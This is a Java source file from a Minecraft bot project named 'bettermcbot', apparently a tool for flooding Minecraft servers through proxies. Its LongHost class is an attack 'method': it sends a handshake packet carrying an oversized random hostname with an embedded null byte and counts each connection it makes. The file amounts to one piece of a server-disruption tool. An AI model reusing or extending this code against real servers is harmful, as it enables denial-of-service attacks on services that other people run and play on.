package ml.dima_dencep.bettermcbot.methods;

import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import ml.dima_dencep.bettermcbot.Main;
import ml.dima_dencep.bettermcbot.NettyBootstrap;
import ml.dima_dencep.bettermcbot.ProxyLoader;
import ml.dima_dencep.bettermcbot.minecraftutils.Handshake;

public class LongHost implements Method {
   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new Handshake(Main.protcolID, "8dCiJ7SpMGW4VTklNf5JhH3LkjvMU3DnVetPR0HEV8OQpCxDuwjWqHbve2L81UsKhrOyUh9y6tOj7hiH5tfkF4tw6dr1A0JtNasoJl2TzDe0WSle3sZRnsu05e0YUUQV4TFN1pv2QsI1xHUXLReNgM13ft9GSq1EdhLdPykZpA9SCQEeb3Z8wy6gnK6g5HVT0IaUaLdyyFKthbpLvxV6cYMH2sC5gB6utTLYI6tvjGE.\u00008dCiJ7SpMG.", Main.port, 2)).getWrappedPacket()));
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
   }
}
